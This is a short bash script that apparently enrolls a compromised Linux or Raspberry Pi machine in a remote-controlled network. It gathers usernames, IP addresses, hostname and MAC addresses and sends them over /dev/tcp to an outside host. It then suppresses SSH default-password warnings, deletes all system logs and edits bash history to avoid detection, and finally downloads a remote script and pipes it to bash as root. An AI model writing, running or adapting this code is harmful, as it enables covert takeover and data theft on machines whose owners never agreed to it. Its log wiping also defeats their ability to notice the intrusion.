#!/usr/bin/bash
host=boesen.science
down_port=2042
up_port=2043

# Don't use whoami, will generally be root, which is useless
user=$(ls /home | xargs -n1 | sort -u | xargs | tr ' ' ',')
# hostname -I returns trailing space
ip=$(hostname -I | sed 's/ *$//')
hostname=$(hostname)
mac=$(cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//')

exec 3<>/dev/tcp/$host/$up_port
printf "JOIN: $user $ip $hostname $mac" >&3

timeout 1 cat <&3

# On Raspberry Pi, prevent "SSH open with default password" warning
sudo rm -f /etc/profile.d/sshpwd.sh /etc/xdg/lxsession/LXDE-pi/sshpwd.sh
# Clear all logs
sudo rm -rf /var/log/*
# Remove last line of bash history to prevent detection if typed into terminal
grep -v "$host:$down_port" ~/.bash_history > /tmp/.bash_history; mv /tmp/.bash_history ~/.bash_history

su -c "curl -L $host:$down_port/linux/update.sh |bash"

clear;clear;clear
